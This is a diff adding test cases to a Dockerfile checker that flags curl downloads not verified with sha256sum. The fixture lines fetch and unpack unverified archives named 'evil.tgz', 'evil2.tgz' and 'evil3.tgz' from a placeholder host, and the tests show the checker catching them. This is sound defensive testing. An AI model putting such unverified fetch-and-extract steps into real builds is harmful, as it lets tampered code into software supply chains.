@@ -252,6 +252,69 @@ RUN curl -fsSL "https://example.com/x.tgz" \\\
   [[ "${lines[*]}" == *"unversioned pip install: somepackage"* ]]
 }
 
+# --- Round 4: multi-stage, combined flags, and same-RUN second download ---
+
+@test "scanner pins: unverified download outside fetcher stage fails" {
+  _write_clean_fixture
+  local D="$WORK_TMP/plugins/gaia/tools/gaia-tools/Dockerfile"
+  # Append a curl download after the runtime FROM — not in the fetcher stage.
+  printf 'RUN curl -fsSL "https://example.com/evil.tgz" \\\n    -o /tmp/evil.tgz && tar -xzf /tmp/evil.tgz -C /opt\n' >> "$D"
+  run "$CHECK_SCRIPT"
+  [ "$status" -eq 1 ]
+  [[ "${lines[*]}" == *"evil.tgz"*"no sha256sum"* ]]
+}
+
+@test "scanner pins: removing sha256sum -c but keeping hashes fails" {
+  _write_clean_fixture
+  local D="$WORK_TMP/plugins/gaia/tools/gaia-tools/Dockerfile"
+  # Add a runtime-stage download verified by sha256sum, then replace
+  # the sha256sum pipe with /dev/null — hash present, check removed.
+  cat >> "$D" <<'DOCK'
+RUN curl -fsSL "https://example.com/tool" \
+      -o /opt/tool && \
+    case "amd64" in \
+      amd64) echo "abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234abcd1234  /opt/tool" | sha256sum -c ;; \
+    esac
+DOCK
+  # Sanity: the clean version must pass.
+  run "$CHECK_SCRIPT"
+  [ "$status" -eq 0 ]
+  # Now strip the sha256sum -c, replacing with a no-op redirect.
+  # Use perl to avoid BSD sed delimiter issues with | in the pattern.
+  perl -pi -e 's{/opt/tool" \| sha256sum -c}{/opt/tool" >/dev/null}g' "$D"
+  run "$CHECK_SCRIPT"
+  [ "$status" -eq 1 ]
+  [[ "${lines[*]}" == *"/opt/tool"*"no sha256sum"* ]]
+}
+
+@test "scanner pins: second curl in same RUN as a verified download fails" {
+  _write_clean_fixture
+  local D="$WORK_TMP/plugins/gaia/tools/gaia-tools/Dockerfile"
+  # Replace the first grype download (line 7) with a two-download RUN:
+  # the verified grype download plus an unverified second download.
+  # Use perl to avoid BSD sed quoting issues with embedded quotes.
+  perl -i -ne '
+    if ($. == 7) {
+      print "RUN curl -fsSL \"https://example.com/grype.tar.gz\" -o grype.tar.gz && \\\n";
+      print "    echo \"ff054e389ffb40619911f6bd75b3f46610245df9b11ab72fcdc2e08b9c34a09e  grype.tar.gz\" | sha256sum -c && \\\n";
+      print "    curl -fsSL \"https://example.com/evil2.tgz\" -o evil2.tgz && tar -xzf evil2.tgz\n";
+    } else { print }
+  ' "$D"
+  run "$CHECK_SCRIPT"
+  [ "$status" -eq 1 ]
+  [[ "${lines[*]}" == *"evil2.tgz"*"no sha256sum"* ]]
+}
+
+@test "scanner pins: combined short flags -fsSLo without verification fails" {
+  _write_clean_fixture
+  local D="$WORK_TMP/plugins/gaia/tools/gaia-tools/Dockerfile"
+  # Append a download using combined flags (-fsSLo) in the runtime stage.
+  printf 'RUN curl -fsSLo /tmp/evil3.tgz https://example.com/evil3.tgz && tar -xzf /tmp/evil3.tgz -C /opt\n' >> "$D"
+  run "$CHECK_SCRIPT"
+  [ "$status" -eq 1 ]
+  [[ "${lines[*]}" == *"evil3.tgz"*"no sha256sum"* ]]
+}
+
 # --- Verify the SHIPPED check script ---
 
 @test "scanner pins: shipped check-scanner-pins.sh passes on shipped Dockerfile and manifest" {
